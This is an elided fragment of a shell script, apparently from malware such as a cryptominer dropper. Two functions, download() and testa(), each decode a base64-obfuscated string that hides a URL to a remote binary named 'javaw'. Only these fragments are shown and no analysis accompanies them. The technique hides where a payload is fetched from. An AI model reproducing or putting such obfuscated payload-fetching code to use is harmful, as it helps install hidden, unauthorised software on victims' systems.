...
function download() {
	...
	if [ ${pa} -eq 0 ];then
		mi_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3poYW5naHVjaGFuamlhbi8xL3Jhdy9tYXN0ZXIvamF2YXcNCg==|base64 -d)
...
function testa() {
	...
	if [ ${pb} -eq 0 ];then
		st_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3poYW5naHVjaGFuamlhbi8xL3Jhdy9tYXN0ZXIvamF2YXcNCg==|base64 -d)
